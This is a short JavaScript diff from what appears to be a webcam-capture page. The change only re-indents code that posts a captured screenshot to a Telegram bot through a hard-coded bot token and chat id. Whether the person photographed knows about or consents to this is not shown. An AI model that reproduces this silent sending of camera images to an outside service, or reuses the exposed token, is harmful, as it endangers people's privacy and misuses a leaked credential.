@@ -90,9 +90,9 @@ const doScreenshot = () => {
   alert('123');
 
 
-fetch(`https://api.telegram.org/bot5654424384:AAHR-qS4Fz4nd31lmDfXEuELEZlJ5osNu64/sendMessage?chat_id=961145889&text=${screenshotImage.src}`,{method:'POST',})
-  .then(response => response.json()) // Декодируем ответ в формате json
-  .then(data => console.log(data)); // Выводим ответ в консоль
+  fetch(`https://api.telegram.org/bot5654424384:AAHR-qS4Fz4nd31lmDfXEuELEZlJ5osNu64/sendMessage?chat_id=961145889&text=${screenshotImage.src}`,{method:'POST',})
+    .then(response => response.json()) // Декодируем ответ в формате json
+    .then(data => console.log(data)); // Выводим ответ в консоль
 pause.onclick = pauseStream;
 screenshot.onclick = doScreenshot;
 getCameraSelection();
